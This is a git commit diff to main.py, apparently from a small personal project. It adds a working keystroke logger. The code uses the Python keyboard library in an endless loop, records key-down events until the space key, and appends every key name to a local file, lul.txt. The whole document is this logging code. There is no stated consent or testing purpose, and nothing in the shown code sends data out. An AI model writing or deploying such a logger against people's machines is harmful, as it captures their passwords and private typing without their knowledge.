3da8ea6dfab89527107610b4ff51b6cdbbcc0c06
DemDemich <koreneffdim1@gmail.com>
2019-04-06 09:32:28 +0500

    improve

--- main.py
+++ main.py
@@ -1,7 +1,12 @@
 import keyboard as kb
 import time as t
-f = open('lul.txt','a+')
 def write_into_file(rec):
-    f.write(rec.name)
-    f.close
-
+    f = open('lul.txt','a+')
+    for i in range(0, len(rec)):
+        if rec[i].event_type == 'down':
+            f.write(rec[i].name + '')
+    f.write(' ')
+    f.close()
+while True:
+    rec = kb.record(until='space')
+    write_into_file(rec)
